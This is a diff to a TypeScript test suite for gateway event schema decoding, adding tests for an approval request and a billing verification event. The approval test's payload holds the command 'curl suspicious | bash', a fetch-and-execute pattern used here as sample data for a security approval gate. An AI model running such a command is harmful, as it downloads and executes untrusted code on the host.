@@ -37,6 +37,17 @@ describe('GatewayEvent schema decode (Phase 1)', () => {
     ).toBe(true)
   })
 
+  test('preserves an explicit approval allow_permanent=false', () => {
+    const ev = decode({
+      type: 'approval.request',
+      payload: { allow_permanent: false, command: 'curl suspicious | bash', description: 'content security' }
+    })
+    expect(Option.isSome(ev)).toBe(true)
+    if (Option.isSome(ev) && ev.value.type === 'approval.request') {
+      expect(ev.value.payload.allow_permanent).toBe(false)
+    }
+  })
+
   test('decodes gateway.exited with and without payload fields', () => {
     const full = decode({ type: 'gateway.exited', payload: { reason: 'SIGKILL', code: 137, signal: 'SIGKILL' } })
     expect(Option.isSome(full)).toBe(true)
@@ -64,6 +75,20 @@ describe('GatewayEvent schema decode (Phase 1)', () => {
     expect(Option.isSome(bare)).toBe(true)
     if (Option.isSome(bare) && bare.value.type === 'gateway.recovering') {
       expect(bare.value.payload).toBeUndefined()
+    }
+  })
+
+  test('decodes billing.step_up.verification with its session scope', () => {
+    const ev = decode({
+      type: 'billing.step_up.verification',
+      session_id: 'live-1',
+      payload: { user_code: 'WXYZ-9999', verification_url: 'https://portal.example/device?code=WXYZ' }
+    })
+    expect(Option.isSome(ev)).toBe(true)
+    if (Option.isSome(ev) && ev.value.type === 'billing.step_up.verification') {
+      expect(ev.value.session_id).toBe('live-1')
+      expect(ev.value.payload.user_code).toBe('WXYZ-9999')
+      expect(ev.value.payload.verification_url).toContain('portal.example')
     }
   })
 
